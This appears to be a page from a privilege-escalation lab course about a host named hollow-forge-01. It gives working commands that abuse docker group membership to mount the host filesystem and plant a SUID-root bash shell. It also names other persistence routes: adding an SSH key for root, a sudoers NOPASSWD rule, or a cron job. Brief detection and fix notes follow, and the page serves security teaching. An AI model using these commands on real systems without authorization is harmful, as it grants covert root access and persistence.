# C08 · Station B — persistent root · ★★★☆

> **Chapter:** [[Chapter-08-Overview]] · **Next:** [[C08-Station-C-raw-socket-api]]
> **Host:** `hollow-forge-01` (`target-docker`) · **Access:** `labuser1` in the `docker` group
> **The bug:** the host mount writes as root — leave yourself a foothold.

---

## 1. Exploit — do this first

```bash
docker run --rm -v /:/host rtr/bb chroot /host \
  sh -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
/tmp/rootbash -p -c 'id; cat /root/flag.txt'     # euid=0
```

---

## 2. How you find it

Same surface as Station A (`id` shows `docker`). A container is ephemeral, so
the move is to write something durable to the host through the mount.

## 3. Why it works

The write happens as root on the host filesystem, so the SUID bit sticks and is
owned by root; `bash -p` keeps the elevated euid instead of dropping it. You've
turned a one-shot container into a durable root primitive. Equally: append your
key to `/root/.ssh/authorized_keys`, add a NOPASSWD sudoers rule, or drop a cron
job — all through the same mount.

## 4. Pitfalls

- Without `-p`, bash drops privileges on launch — keep it.
- Clean up `/tmp/rootbash` when done (the self-test does).

## 5. Detect & fix

- **Detect:** new SUID-root binaries (`find / -perm -4000 -newer …`); writes to `/root/.ssh`, `/etc/sudoers.d`.
- **Fix:** same as A — remove socket access; rootless runtime. [[Blue-Team-Playbook]].

## 6. What you learned

- Read is nice; persistence is better. The mount writes as root, so SUID/keys/cron all stick.

> Next: [[C08-Station-C-raw-socket-api]] · Related: [[C01-Station-A-GTFOBins-find]]
